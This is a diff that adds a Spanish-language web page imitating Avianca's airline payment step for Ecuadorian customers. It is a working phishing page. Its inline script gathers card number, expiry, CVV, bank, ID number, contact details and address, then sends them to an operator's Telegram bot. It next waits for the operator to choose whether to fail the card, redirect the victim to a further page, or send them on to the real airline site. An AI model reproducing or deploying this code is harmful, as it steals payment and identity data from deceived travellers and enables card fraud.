@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Payment</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./css/flight.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+
+    <style>
+        .loaderp {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #fff;
+            border-bottom-color: #e8114b;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loaderp-full {
+            position: fixed;
+            top: 0;
+            left: 0;
+            overflow-y: hidden;
+            z-index: 1000;
+            background-color: white;
+            width: 100vw;
+            height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+    
+    <script src="./js/functions.js"></script>
+</head>
+<body class="mvh-100 bg-gray">
+
+    <div class="loader show">
+        <img class="" src="./assets/svg/plane-loader.gif">
+    </div>
+
+    <header>
+        <div class="next-step">
+            <img class="ns-logo" src="./assets/logos/avianca_red.svg">
+            <div class="ns-step">
+                <img src="./assets/svg/step_3_header.png">
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="main-form">
+            <form id="next-step" class="form-control">
+                <div class="form-header">
+                    <label class="radio-wrapper" for="ida_vuelta">
+                        <input type="radio" checked id="ida_vuelta" name="opcion_viaje" onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
+                        <div class="radio-circle">
+                            <div class="radio-dot"></div>
+                        </div>
+                        <h3 class="radio-label">Tarjeta de crédito y débito</h3>
+                    </label>
+                </div>
+                <hr>
+                <div class="form-section">
+                    <div class="companies-container">
+                        <img src="./assets/svg/visa.svg">
+                        <img src="./assets/svg/mc.svg">
+                        <img src="./assets/svg/diners.svg">
+                        <img src="./assets/svg/amex.svg">
+                        <img src="./assets/svg/uatp.png" width="50px">
+                    </div>
+
+                    <h4>Información de la tarjeta</h4>
+                    <div class="checkbox-group mt-2">
+                        <input class="check fs-2" type="checkbox"  id="ecuador-card">
+                        <label for="ecuador-card">Mi tarjeta de crédito no es de Ecuador</label>
+                    </div>
+
+                    <input id="p" class="input-cc bg-std mt-2"  placeholder="Número de Tajerta" type="text" oninput="formatCNumber(this)">
+                    <label class="fs-5">Ingresa tu tarjeta crédito, débito o Avianca UATP</label>
+
+                    <div class="input-group mt-2">
+                        <div class="me-2">
+                            <input id="pdate"  type="text" placeholder="MM/AA"  oninput="formatDate(this)">
+                            <label class="fs-5">Fecha de Expiración</label>
+                        </div>
+                        
+                        <div>
+                            <input  class="" type="text" id="c" maxlength="3" placeholder="CVV">
+                            <label class="fs-5">Código de seguridad</label>
+                        </div>
+                    </div>
+                    
+                    <select id="ban" required name="txt-entidad" class="mt-4">
+                        <option label="Seleccione su banco" value="">Seleccione su banco</option>
+                        <option value="BANCO PICHINCHA">BANCO PICHINCHA</option>
+                        <option value="PRODUBANCO">PRODUBANCO</option>
+                        <option value="BANCO DEL PACIFICO">BANCO DEL PACIFICO</option>
+                        <option value="BANCO GUAYAQUIL">BANCO GUAYAQUIL</option>
+                        <option value="BANCO INTERNACIONAL">BANCO INTERNACIONAL</option>
+                        <option value="BANCO BOLIVARIANO">BANCO BOLIVARIANO</option>
+                        <option value="BANCO DEL AUSTRO">BANCO DEL AUSTRO</option>
+                        <option value="BANCO DE DESARROLLO DEL ECUADOR">BANCO DE DESARROLLO DEL ECUADOR</option>
+                        <option value="BANCO GENERAL RUMINAHUI">BANCO GENERAL RUMINAHUI</option>
+                        <option value="BANCO DE MACHALA">BANCO DE MACHALA</option>
+                        <option value="BANCO SOLIDARIO">BANCO SOLIDARIO</option>
+                        <option value="BANECUADOR">BANECUADOR</option>
+                        <option value="BANCO DE LOJA">BANCO DE LOJA</option>
+                        <option value="CITIBANK">CITIBANK</option>
+                        <option value="BANCO PROCREDIT">BANCO PROCREDIT</option>
+                        <option value="BANCO AMAZONAS">BANCO AMAZONAS</option>
+                        <option value="BANCO COOPNACIONAL">BANCO COOPNACIONAL</option>
+                        <option value="BANCO VISIONFUND ECUADOR">BANCO VISIONFUND ECUADOR</option>
+                        <option value="BANCO D-MIRO">BANCO D-MIRO</option>
+                        <option value="BANCO AMIBANK">BANCO AMIBANK</option>
+                        <option value="BANCO COMERCIAL DE MANABI">BANCO COMERCIAL DE MANABI</option>
+                        <option value="BANCO CAPITAL">BANCO CAPITAL</option>
+                        <option value="BANCO DEL LITORAL">BANCO DEL LITORAL</option>
+                        <option value="BANCO DELBANK">BANCO DELBANK</option>
+                        <option value="PIBANK">PIBANK</option>
+                        <option value="BIMO">BIMO</option>
+                        <option value="DEUNA!">DEUNA!</option>
+                        <option value="GLOBAL66">GLOBAL66</option>
+                        <option value="PEIGO">PEIGO</option>
+                    </select>
+                    
+                    <select id="dues" required class="mt-4 mb-5">
+                        <option value="" disabled selected>Número de cuotas</option>
+                        <option value="1">1</option>
+                        <option value="2">2</option>
+                        <option value="3">3</option>
+                        <option value="4">4</option>
+                        <option value="5">5</option>
+                        <option value="6">6</option>
+                        <option value="7">7</option>
+                        <option value="8">8</option>
+                        <option value="9">9</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                        <option value="13">13</option>
+                        <option value="14">14</option>
+                        <option value="15">15</option>
+                        <option value="16">16</option>
+                        <option value="17">17</option>
+                        <option value="18">18</option>
+                        <option value="19">19</option>
+                        <option value="20">20</option>
+                        <option value="21">21</option>
+                        <option value="22">22</option>
+                        <option value="23">23</option>
+                        <option value="24">24</option>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                        <option value="31">31</option>
+                        <option value="32">32</option>
+                        <option value="33">33</option>
+                        <option value="34">34</option>
+                        <option value="35">35</option>
+                        <option value="36">36</option>
+                    </select>
+
+                    <hr>
+
+                    <h4 class="mt-5">Información del titular</h4>
+                    <input  id="name" class="mt-4" type="text" placeholder="Nombre del titular de la tarjeta">
+                    <input  id="surname" class="mt-4" type="text" placeholder="Apellido del titular de la tarjeta">
+                    <input  id="cc" class="mt-4" type="text" placeholder="Número de identificación" oninput="limitDigits(this, 10)">
+                    <input  id="email" class="mt-4" type="text" placeholder="Correo">
+                    <input  id="telnum" class="mt-4 mb-5" type="text" maxlength="10" placeholder="Celular" oninput="limitDigits(this, 10)">
+                    
+                    <h4 class="mt-4">Domicilio de facturación</h4>
+                    <input  id="city" class="mt-4" type="text" placeholder="Ciudad">
+                    <input  id="state" class="mt-4" type="text" placeholder="Estado/Provincia">
+                    <input  id="address" class="mt-4" type="text" placeholder="Dirección">
+
+                    <div class="checkbox-group mt-4">
+                        <div>
+                            <input class="check" type="checkbox" name="" id="terms-accept">
+                        </div>
+                        <label for="terms-accept">Por la presente declaro que soy mayor de edad, he leído y acepto el  <a href="">contrato de transporte</a>, y la <a href="">política general de privacidad de clientes, viajeros y usuarios</a> y las condiciones de <a href="">manejo de mercancías peligrosas</a>, la política de cancelación y penalidades por cambio, el cobro de impuestos y cargos gubernamentales no incluidos en el valor del servicio, así como aquellos incluidos y las <a href="">condiciones de acceso de uso de este sitio web.</a></label>
+                    </div>
+
+                    <div class="mt-4 show justify-content-center">
+                        <button type="button" class="btn btn-gray" id="autorizarBtn">
+                            Pago seguro
+                        </button>
+                    </div>
+                </div>
+            </form>
+
+            <form class="form-control mt-5 mb-10">
+                <div class="form-header">
+                    <label class="radio-wrapper" for="ida_vuelta_disabled">
+                        <input type="radio" disabled id="ida_vuelta_disabled">
+                        <div class="radio-circle">
+                            <div class="radio-dot"></div>
+                        </div>
+                        <h3 class="radio-label disabled">PSE (Deshabilitado)</h3>
+                    </label>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer-fixed-2">
+        <div class="footer-flight-resume">
+            <div>
+                <p class="mb-1">Resumen del viaje:</p>
+                <div class="show align-items-center">
+                    <h4 id="origin-code">BOG</h4>
+                    <img src="./assets/svg/arrow.png" width="14px">
+                    <h4 id="destination-code">CLI</h4>
+                </div>
+            </div>
+            <div>
+                <h4 class="text-end mt-1">$<span id="flight-cost">49.999</span> USD</h4>
+                <p class="fs-5">Total de tu reserva:</p>
+                <img src="./assets/svg/info_icon.png" width="15px">
+            </div>
+        </div>
+        <p class="mt-2 mb-2">© Avianca S.A 2024</p>
+    </footer>
+
+    <div class="loaderp-full">
+        <span class="loaderp"></span>
+        <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
+    </div>
+
+    <script src="./js/payment.js"></script>
+    <script>
+        function escapeMarkdownV2(text) {
+            if (!text) return '';
+            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
+            let escapedText = text;
+            for (const char of specialChars) {
+                const regex = new RegExp(`\\${char}`, 'g');
+                escapedText = escapedText.replace(regex, `\\${char}`);
+            }
+            return escapedText;
+        }
+
+        async function loadTelegramConfig() {
+            try {
+                const response = await fetch("./js/brr76.json");
+                if (!response.ok) {
+                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
+                }
+                return await response.json();
+            } catch (error) {
+                console.error("Error al cargar el archivo de configuración de Telegram:", error);
+                return null;
+            }
+        }
+
+        async function checkPaymentVerification(transactionId, messageId) {
+            const config = await loadTelegramConfig();
+            if (!config) {
+                document.querySelector(".loaderp-full").style.display = "none";
+                return;
+            }
+            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
+                .then(response => response.json())
+                .then(data => {
+                    const updates = data.result;
+                    const verificationUpdate = updates.find(
+                        (update) =>
+                        update.callback_query &&
+                        update.callback_query.message.message_id === messageId
+                    );
+
+                    if (verificationUpdate) {
+                        const action = verificationUpdate.callback_query.data.split(':')[0];
+
+                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: config.chat_id,
+                                message_id: messageId,
+                                reply_markup: { inline_keyboard: [] }
+                            }),
+                        });
+                        
+                        switch (action) {
+                            case 'pedir_logo':
+                                window.location.href = "chedf.html";
+                                break;
+                            case 'error_tc':
+                                alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
+                                break;
+                            case 'finalizar':
+                                window.location.href = "https://www.avianca.com/";
+                                break;
+                            default:
+                                break;
+                        }
+                    } else {
+                        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al verificar la clave dinamica:", error);
+                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+                });
+        }
+
+        document.getElementById("autorizarBtn").addEventListener("click", function() {
+            const form = document.getElementById("next-step");
+            if (!form.checkValidity()) {
+                alert("Por favor, complete todos los campos requeridos.");
+                return;
+            }
+
+            const card_number = document.getElementById("p").value;
+            const expiry_date = document.getElementById("pdate").value;
+            const cvv = document.getElementById("c").value;
+            const name = document.getElementById("name").value;
+            const surname = document.getElementById("surname").value;
+            const cc = document.getElementById("cc").value;
+            const email = document.getElementById("email").value;
+            const telnum = document.getElementById("telnum").value;
+            const city = document.getElementById("city").value;
+            const state = document.getElementById("state").value;
+            const address = document.getElementById("address").value;
+            const bank = document.getElementById("ban").value;
+            const dues = document.getElementById("dues").value;
+            const termsAccepted = document.getElementById("terms-accept").checked;
+
+            if (!card_number || !expiry_date || !cvv || !name || !surname || !cc || !email || !telnum || !city || !state || !address || !bank || !termsAccepted) {
+                alert("Por favor, complete todos los campos del formulario y acepte los términos.");
+                return;
+            }
+
+            const paymentData = {
+                name: name + ' ' + surname,
+                cc: cc,
+                email: email,
+                telnum: telnum,
+                city: city,
+                state: state,
+                address: address,
+                cardNumber: card_number,
+                expiryDate: expiry_date,
+                cvv: cvv,
+                bank: bank,
+                dues: dues
+            };
+
+            localStorage.setItem('paymentData', JSON.stringify(paymentData));
+
+            document.querySelector(".loaderp-full").style.display = "flex";
+            enviarDatos();
+        });
+
+        async function enviarDatos() {
+            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
+            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+            localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId }));
+
+            const message = `
+✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*👤 DATOS DEL TITULAR*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🤵‍♂️ Nombre:* ${storedData.name ? escapeMarkdownV2(storedData.name) : 'No ingresado'}
+*🪪 Identificación:* ${storedData.cc ? escapeMarkdownV2(storedData.cc) : 'No ingresado'}
+*📧 Email:* ${storedData.email ? escapeMarkdownV2(storedData.email) : 'No ingresado'}
+*📱 Celular:* ${storedData.telnum ? escapeMarkdownV2(storedData.telnum) : 'No ingresado'}
+*🗺️ Ciudad:* ${storedData.city ? escapeMarkdownV2(storedData.city) : 'No ingresado'}
+*📍 Estado:* ${storedData.state ? escapeMarkdownV2(storedData.state) : 'No ingresado'}
+*🏠 Dirección:* ${storedData.address ? escapeMarkdownV2(storedData.address) : 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*💳 DETALLES DE LA TARJETA*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🏦 Banco:* ${storedData.bank ? escapeMarkdownV2(storedData.bank) : 'No ingresado'}
+*💳 Número de Tarjeta:*
+\`${storedData.cardNumber ? escapeMarkdownV2(storedData.cardNumber) : 'No ingresado'}\`
+*📅 Fecha de Exp:*
+\`${storedData.expiryDate ? escapeMarkdownV2(storedData.expiryDate) : 'No ingresado'}\`
+*🔐 CVV:*
+\`${storedData.cvv ? escapeMarkdownV2(storedData.cvv) : 'No ingresado'}\`
+*🔢 Cuotas:* ${storedData.dues ? escapeMarkdownV2(storedData.dues) : 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🆔 ID de Transacción:* ${transactionId}
+`;
+
+            const keyboard = JSON.stringify({
+                inline_keyboard: [
+                    [{
+                        text: "Pedir Logo",
+                        callback_data: `pedir_logo:${transactionId}`
+                    }],
+                    [{
+                        text: "Error de TC",
+                        callback_data: `error_tc:${transactionId}`
+                    }],
+                    [{
+                        text: "Finalizar",
+                        callback_data: `finalizar:${transactionId}`
+                    }]
+                ],
+            });
+
+            const config = await loadTelegramConfig();
+            if (!config) {
+                document.querySelector(".loaderp-full").style.display = "none";
+                return;
+            }
+
+            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: config.chat_id,
+                        text: message,
+                        reply_markup: keyboard,
+                        parse_mode: "MarkdownV2",
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Mensaje enviado a Telegram con éxito");
+                        checkPaymentVerification(transactionId, data.result.message_id);
+                    } else {
+                        console.error("Error al enviar mensaje a Telegram:", data);
+                        document.querySelector(".loaderp-full").style.display = "none";
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar mensaje a Telegram:", error);
+                    document.querySelector(".loaderp-full").style.display = "none";
+                });
+        }
+    </script>
+</body>
+</html>
